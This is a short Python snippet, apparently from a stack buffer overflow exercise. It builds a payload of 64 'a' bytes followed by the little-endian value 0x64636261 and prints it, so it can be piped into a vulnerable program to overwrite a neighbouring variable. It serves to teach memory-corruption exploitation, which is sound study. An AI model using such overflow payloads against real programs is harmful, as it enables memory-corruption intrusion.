buffer = "a" * 64
modified = "\x64\x63\x62\x61"
payload = buffer + modified
print(payload)